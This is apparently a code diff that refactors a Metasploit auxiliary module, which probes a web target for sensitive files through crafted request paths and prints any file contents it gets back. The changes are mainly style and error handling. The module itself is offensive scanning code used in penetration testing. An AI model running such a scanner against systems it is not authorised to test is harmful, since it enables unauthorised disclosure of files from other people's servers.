@@ -30,7 +30,12 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'Author' => [ 'aushack', 'guerrino <ruggine> di massa' ],
       'License' => MSF_LICENSE,
-      'DisclosureDate' => 'Jan 9 2009'
+      'DisclosureDate' => 'Jan 9 2009',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -49,12 +54,10 @@ class MetasploitModule < Msf::Auxiliary
   def extract_words(wordfile)
     return [] unless wordfile && File.readable?(wordfile)
 
-    begin
-      File.readlines(wordfile, chomp: true)
-    rescue ::StandardError => e
-      elog(e)
-      []
-    end
+    File.readlines(wordfile, chomp: true)
+  rescue ::StandardError => e
+    elog(e)
+    []
   end
 
   def find_files(files)
@@ -68,11 +71,11 @@ class MetasploitModule < Msf::Auxiliary
           'uri' => normalize_uri(datastore['TARGETURI'], try, files)
         }, 25
       )
-      if (res && (res.code == 200))
+      if res && (res.code == 200)
         print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
         @files_found << files
         break
-      elsif (res && res.code)
+      elsif res && res.code
         vprint_error("Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
       end
     end
@@ -81,32 +84,33 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(_ip)
     @files_found = []
 
-    begin
-      print_status("Attempting to connect to #{rhost}:#{rport}")
-      res = send_request_raw(
-        {
-          'method' => 'GET',
-          'uri' => normalize_uri(datastore['TARGETURI'])
-        }, 25
-      )
+    print_status("Attempting to connect to #{rhost}:#{rport}")
+    res = send_request_raw(
+      {
+        'method' => 'GET',
+        'uri' => normalize_uri(datastore['TARGETURI'])
+      }, 25
+    )
 
-      if res
-        extract_words(datastore['SENSITIVE_FILES']).each do |files|
-          find_files(files) unless files.empty?
-        end
+    if res
+      extract_words(datastore['SENSITIVE_FILES']).each do |files|
+        find_files(files) unless files.empty?
       end
-
-      if !@files_found.empty?
-        print_good('File(s) found:')
-
-        @files_found.each do |f|
-          print_good(f)
-        end
-      else
-        print_error('No File(s) found')
-      end
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-    rescue ::Timeout::Error, ::Errno::EPIPE
     end
+
+    if @files_found.empty?
+      print_error('No File(s) found')
+      return
+    end
+
+    print_good('File(s) found:')
+
+    @files_found.each do |f|
+      print_good(f)
+    end
+  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
+    vprint_error(e.message)
+  rescue ::Timeout::Error, ::Errno::EPIPE => e
+    vprint_error(e.message)
   end
 end
